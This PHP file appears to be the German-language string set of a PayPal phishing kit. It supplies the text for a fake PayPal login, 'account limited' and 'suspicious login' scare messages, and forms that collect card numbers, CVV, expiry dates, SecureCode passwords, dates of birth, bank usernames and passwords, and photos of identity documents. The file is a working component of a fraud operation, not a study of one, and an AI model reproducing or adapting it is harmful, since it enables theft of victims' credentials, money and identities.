<?php

#ANMELDUNG
$Wiz_111 = 'Melden Sie sich bei Ihrem PayPaI-Konto an';
$Wiz_222 = 'Probleme beim Einloggen?';
$Wiz_333 = 'Sign Up';
$Wiz_444 = 'Alle Rechte vorbehalten für PayPal Inc';
$wiz_900 = 'Email';
$wiz_901 = 'Password';
$wiz_902 = 'Einloggen';
#INFO
$Wiz_555 = 'Profil';
$Wiz_666 = 'Aktualisieren Sie Ihr Foto';
$Wiz_777 = 'Hi Again!';
$Wiz_888 = 'Ihr PayPal-Konto wurde begrenzt!';
$Wiz_999 = 'Erforderliche Informationen';
$wiz_903 = 'Vorname';
$wiz_904 = 'Familienname, Nachname';
$wiz_905 = 'Adresse';
$wiz_906 = 'Stadt';
$wiz_907 = 'Bundesland';
$wiz_910 = 'Postleitzahl';
$wiz_911 = 'Telefonnummer';
# ----- NAV
$Wiz_101 = 'Zusammenfassung';
$Wiz_102 = 'Aktivität';
$Wiz_103 = 'Übertragen';
$Wiz_104 = 'Wallet';
$Wiz_105 = 'Magasiner';
$Wiz_106 = 'Abmelden';
$Wiz_107 = 'Menüprinzipal';
$Wiz_108 = 'Konto';
$Wiz_109 = 'Sicherheit';
$Wiz_112 = 'Zahlungen';
$Wiz_113 = 'Benachrichtigungen';
#------FUSSZEILE
$Wiz_114 = 'HELP / US ';
$Wiz_115 = 'SECURITY';
$Wiz_116 = 'Alle Rechte vorbehalten';
$Wiz_117 = 'Respekt der Privatsphäre';
$Wiz_118 = "Dienstverträge";
$Wiz_119 = 'Kommentare';
# ------- CCV
$Wiz_120 = 'Kreditkarte';
$Wiz_121 = 'Name on Cart';
$Wiz_123 = 'card number';
$Wiz_124 = "Datum d' exp ";
$Wiz_125 = 'CVV à 3 chiffres';
$Wiz_126 = 'adress';
$Wiz_127 = 'Bestätigen und verarbeiten';
#-------- VBV
$Wiz_128 = 'Willkommen bei Verification ™';
$Wiz_129 = 'Bitte geben Sie die folgenden Informationen ein, um Ihre Identität zu bestätigen.';
$Wiz_130 = 'Ablaufdatum der Karte:';
$Wiz_131 = 'Validierungscode für Karten:';
$Wiz_132 = 'Geburtsdatum:';
$Wiz_133 = 'Passwort oder SecureCode:';
$Wiz_134 = 'Alle Rechte vorbehalten.';
#--------BANK
$Wiz_135 = 'Wählen Sie aus einer dieser gemeinsamen Banken';
$Wiz_136 = 'Sicher';
$Wiz_137 = 'Ich habe eine andere Bank';
$Wiz_138 = "Es ist sicher, diese Informationen weiterzugeben. PayPal wird nicht gespeichert.";
$Wiz_139 = 'Durch Klicken';
$Wiz_140 = 'Weiter';
$Wiz_141 = 'Ich stimme den Bedingungen für die Bankverbindung zu.';
$Wiz_142 = 'Ihre Bank';
$Wiz_143 = "Es ist sicher, diese Informationen zu teilen. PayPal wird nicht gespeichert.";
$Wiz_144 = 'Username';
$wiz_145 = 'Passwort';
$wiz_146 = 'Beim Klicken';
$wiz_147 = 'Fortsetzen';
$wiz_148 = 'Ich stimme den Bedingungen für die Verlinkung meines Bankkontos zu.';
$wiz_149 = 'Deine Bank';
$wiz_150 = 'Name Bank';
#--------Loading AND Police
$wiz_151 = 'Verarbeitung';
$wiz_152 = 'Verdächtige Aktivitäten - Payapl';
$wiz_153 = 'Um Ihr Konto zu schützen, suchen wir regelmäßig nach frühen Anzeichen für potenziell betrügerische Aktivitäten.';
$wiz_154 = 'Wir sind besorgt über mögliche nicht autorisierte Aktivitäten';
$wiz_155 = 'Nachdem Sie Ihre Identität bestätigt haben, führen wir Sie durch Schritte, um Ihr Konto sicherer zu machen.';
$wiz_156 = 'Login von Unbekannten Gerät';
$wiz_157 = 'In der Nähe von Ossining, USA';
$wiz_158 = 'Nur um sicher zu sein, wollen wir sicherstellen, dass dies Ihr Konto ist.';
$wiz_159 = 'Kontakt';
$wiz_160 = 'Sicherheit';
$wiz_161 = 'Ausloggen';
$wiz_162 = 'Die folgenden Schritte müssen Sie vollständig gefüllt, um die Sicherheit Ihres Kontos zu halten und dass er nicht ein Durchbruch ist';
#--------UPLOAD CART ID
$wiz_163 = 'Bestätige deine Identität';
$wiz_164 = 'Wählen';
$wiz_165 = 'Identitätsnachweis (empfohlen)';
$wiz_166 = 'Empfangen Sie einen Text';
$wiz_167 = 'Empfangen Sie einen automatischen Anruf';
$wiz_168 = 'Fehler Diese Option ist nicht verfügbar. Versuchen Sie es mit anderen Optionen';
$wiz_169 = 'Welche Art von Dokument werden Sie hochladen?';
$wiz_170 = 'Dateianforderungen anzeigen';
$wiz_171 = 'Dateien sollten kleiner als 10 MB sein.';
$wiz_172 = 'Verwenden Sie einen dieser Dateitypen: JPG, GIF, PNG oder PDF.';
$wiz_173 = 'Hochladen von Dateien, die aktuelle und lesbare Details anzeigen.';
$wiz_174 = 'Wählen Sie einen aus';
$wiz_175 = "Führerschein";
$wiz_176 = 'Reisepass';
$wiz_177 = 'Militärische ID';